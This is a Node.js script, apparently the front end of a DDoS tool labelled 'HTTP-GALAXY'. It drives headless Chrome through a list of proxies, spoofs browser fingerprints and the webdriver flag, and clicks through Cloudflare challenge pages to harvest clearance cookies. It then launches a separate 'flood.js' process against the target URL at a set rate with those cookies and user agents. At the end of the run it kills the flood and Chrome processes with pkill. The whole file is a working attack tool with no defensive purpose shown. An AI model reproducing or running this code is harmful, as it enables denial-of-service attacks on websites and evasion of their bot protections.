const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");

const COOKIES_MAX_RETRIES = 1;
const errorHandler = error => {
    console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function (item) {
    const index = this.indexOf(item);
    if (index !== -1) {
        this.splice(index, 1);
    }
    return item;
};

async function spoofFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        // Spoof screen resolution
        Object.defineProperty(window, 'screen', {
            value: {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 64,
                pixelDepth: 64
            }
        });

        // Spoof user agent
        Object.defineProperty(navigator, 'userAgent', {
            value: 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36'
        });

        // Spoof WebGL information
        const gl = canvas.getContext('webgl');
        gl.getParameter = function(parameter) {
            if (parameter === gl.VENDOR) {
                return 'WebKit';
            } else if (parameter === gl.RENDERER) {
                return 'Apple GPU';
            } else {
                return gl.getParameter(parameter);
            }
        };

        // Spoof plugins
        Object.defineProperty(navigator, 'plugins', {
            value: [{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 }]
        });

// Spoof languages
Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });

// Spoof webdriver
Object.defineProperty(navigator, 'webdriver', { get: () => false });

// Spoof hardware concurrency
Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });

// Spoof device memory
Object.defineProperty(navigator, 'deviceMemory', { value: 256 }); // Đổi từ 0,25 thành 256 để có giá trị thực tế hơn


        Object.defineProperty(document, 'cookie', {
          configurable: true,
          enumerable: true,
          get: function() { return ''; },
          set: function() {}
        });

        Object.defineProperty(navigator, 'cookiesEnabled', {
          configurable: true,
          enumerable: true,
          get: function() { return true; },
          set: function() {}
       });

        Object.defineProperty(window, 'localStorage', {
         configurable: true,
         enumerable: true,
         value: {
         getItem: function() { return null; },
         setItem: function() {},
         removeItem: function() {}
          }
       });

// Spoof Do Not Track
Object.defineProperty(navigator, 'doNotTrack', { value: null });

// Spoof max touch points
Object.defineProperty(navigator, 'maxTouchPoints', { value: 10 });

// Spoof language
Object.defineProperty(navigator, 'language', { value: 'en-US' });

        // Spoof vendorSub
        Object.defineProperty(navigator, 'vendorSub', {
            value: ''
        });
    });
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
if (process.argv.length < 6) {
    console.error("node browser target theard proxy rate time");
    process.exit(1);
}
const targetURL = process.argv[2];
const threads = process.argv[3];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = process.argv[6];

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/);
        return proxies;
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);
const userAgents = [
'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0',
'Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15', 
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15'
];

const colors = {
	COLOR_RED: "\x1b[31m",
    COLOR_PINK: "\x1b[35m",
    COLOR_WHTIE: "\x1b[37m",
    COLOR_YELLOW: "\x1b[33m",
    COLOR_GREEN: "\x1b[32m",
    cc: "\x1b[38;5;57m",
    COLOR_RESET: "\x1b[0m"
};

function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
};

async function detectChallenge(browser, page, browserProxy) {
    const title = await page.title();
    const content = await page.content();
  
    if (title === "Attention Required! | Cloudflare") {
        throw new Error("Proxy blocked");
    }
  
    if (content.includes("challenge-platform")) {
        colored(colors.COLOR_WHTIE, "[HTTP-GALAXY] Start Bypass Proxy: " + browserProxy);
    
        try {
            await sleep(18);
            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            await captchaContainer.click({ offset: { x: 20, y: 20 } });
        } catch (error) {
            // Handle any errors
        } finally {
            await sleep(8);
            return;
        }
    }
  
    colored(colors.COLOR_YELLOW, "[HTTP-GALAXY] No challenge detected " + browserProxy);
    await sleep(10);
}

async function openBrowser(targetURL, browserProxy) {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const options = {
        headless: "new",
        ignoreHTTPSErrors: true,
        args: [
            "--proxy-server=http://" + browserProxy,
            "--no-sandbox",
            "--no-first-run",
            "--ignore-certificate-errors",
            "--disable-extensions",
            "--test-type",
            "--user-agent=" + userAgent,
            "--disable-gpu",
            "--disable-browser-side-navigation"
        ]
    };

    let browser;
    try {
        browser = await puppeteer.launch(options);
    } catch (error) {
        
        return;
    }
  
    try {
        colored(colors.COLOR_YELLOW, "[HTTP-GALAXY] Start Proxy: " + browserProxy);
        const [page] = await browser.pages();
        const client = page._client();
    
        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id });
            }
        });
    
        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await detectChallenge(browser, page, browserProxy);
        const title = await page.title();
        const cookies = await page.cookies(targetURL);
    
        return {
            title: title,
            browserProxy: browserProxy,
            cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
            userAgent: userAgent
        };
    } catch (error) {
    } finally {
        colored(colors.COLOR_RED, "[HTTP-GALAXY] Error SOLVING Proxy: " + browserProxy);
        await browser.close();
    }
}

async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === COOKIES_MAX_RETRIES) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
    } else {
        try {
            const response = await openBrowser(targetURL, browserProxy);
            if (response) {
                if (response.title === "Just a moment...") {
                    colored(colors.COLOR_RED, "[HTTP-GALAXY] Run Proxy: " + browserProxy + " - Clicking captcha failed");
                    await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
                    return;
                 }
                
                const cookies = "{\n[ pageTitle ]:" + response.title + "\n [ proxyAddress ]: " + response.browserProxy + "\n [ userAgent ]:" + response.userAgent + "\n [ cookies ]: " + response.cookies + "\n}";
                console.log( "{ " + "\n" + cookies);
                spawn("node", [
                  "flood.js",
                  targetURL,
                  "50",
                  "1",
                  response.browserProxy,
                  rates,
                  response.cookies,
                  response.userAgent
                ]);
            }
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        } catch (error) {
            colored(colors.COLOR_WHTIE, error.message);
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        }
    }
}

const queue = async.queue(function (task, done) {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

const { exec } = require('child_process');

async function main() {
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({ browserProxy: browserProxy });
    }

    await sleep(duration);
    queue.kill();

    exec('pkill -f flood.js', (err) => {
        if (err) console.error('Lỗi khi pkill flood.js:', err.message);
    });

    exec('pkill -f Chrome', (err) => {
        if (err) console.error('Lỗi khi pkill Chrome:', err.message);
    });

    process.exit();
}

console.log("Running...");
main();
